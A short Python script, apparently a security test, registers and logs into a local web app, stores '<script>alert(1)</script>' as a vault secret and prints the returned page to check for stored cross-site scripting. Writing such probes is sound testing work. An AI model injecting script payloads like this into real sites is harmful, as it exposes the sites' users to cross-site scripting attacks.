import requests

s = requests.Session()

username = "pierreicsXSS"
password = "MyWeakPassword123!"
url = "http://localhost:3000"


s.post(url + "/register", data={"username": username, "password": password})

s.post(url + "/login", data={"username": username, "password": password})

secret = "<script>alert(1)</script>"
s.post(url + "/vault", data={"secret": secret})

r = s.get(url + "/vault")
print(r.text)
